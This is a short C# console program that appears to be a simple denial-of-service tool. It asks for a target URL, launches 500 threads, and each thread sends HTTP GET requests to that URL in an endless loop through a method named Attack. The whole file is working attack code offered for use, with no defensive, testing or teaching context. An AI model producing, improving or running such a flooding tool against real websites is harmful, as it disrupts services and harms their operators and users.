class Program
{
    private static readonly HttpClient _client = new HttpClient();
    private static int pcBlocks = 500;
    public static void Main()
    {
        Console.Write("Pleace enter url : ");
        string url = Console.ReadLine()!;
        Run(url);
    }

    public static void Run(string url)
    {
        for (int i = 0; i < pcBlocks; i++)
        {
            Thread thread = new Thread(()=>Attack(url));
            thread.Start();
        }
        Console.ReadLine(); 
        Console.Write("Successfull");
    }

    public static void Attack(string url)
    {
        while (true)
        {
            HttpRequestMessage request = new HttpRequestMessage()
            {
                Method = HttpMethod.Get,
                RequestUri = new Uri(url)
            };
            var result = _client.Send(request);
            Console.WriteLine(result.StatusCode);
        }
    }
}